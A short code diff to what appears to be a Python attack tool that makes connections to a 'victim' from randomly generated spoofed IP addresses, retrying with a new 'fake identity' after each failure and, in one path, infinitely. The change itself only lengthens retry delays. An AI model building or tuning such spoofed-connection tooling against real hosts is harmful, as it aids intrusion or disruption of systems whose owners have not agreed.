@@ -188,7 +188,7 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 		print('Failed to bind ip to victim')
 		time.sleep(1)
 		close_connection(s, src_ip, src_port, interface)
-		time.sleep(3)
+		time.sleep(10)
 		rand_ip = random_ip()
 		create_task(False, 'Creating fake identity: ' + rand_ip, make_fake_connection, rand_ip, dst_ip, True, attempt_number - 1)
 		return
@@ -200,7 +200,7 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 		print('Failed to connect to victim')
 		time.sleep(1)
 		close_connection(s, src_ip, src_port, interface)
-		time.sleep(3)
+		time.sleep(10)
 		rand_ip = random_ip()
 		create_task(False, 'Creating fake identity: ' + rand_ip, make_fake_connection, rand_ip, dst_ip, True, attempt_number - 1)
 		return
@@ -226,7 +226,7 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 		time.sleep(1)
 		if temp_listener != None: temp_listener.stop()
 		close_connection(s, src_ip, src_port, interface)
-		time.sleep(3)
+		time.sleep(10)
 		rand_ip = random_ip()
 		create_task(False, 'Creating fake identity: ' + rand_ip, make_fake_connection, rand_ip, dst_ip, True, attempt_number - 1)
 		return
@@ -253,6 +253,7 @@ def reconnect(the_socket, other_socket, src_ip, src_port, dst_ip, dst_port, inte
 	close_connection(the_socket, src_ip, src_port, interface)
 	close_connection(other_socket, dst_ip, dst_port, interface)
 	#make_fake_connection(src_ip = random_ip(), dst_ip, verbose=True, attempt_number = 3)
+	time.sleep(1)
 	try:
 		# With attempt_number == -1, it will retry to connect infinitely
 		make_fake_connection(src_ip = random_ip(), dst_ip = victim_ip, verbose = True, attempt_number = -1)
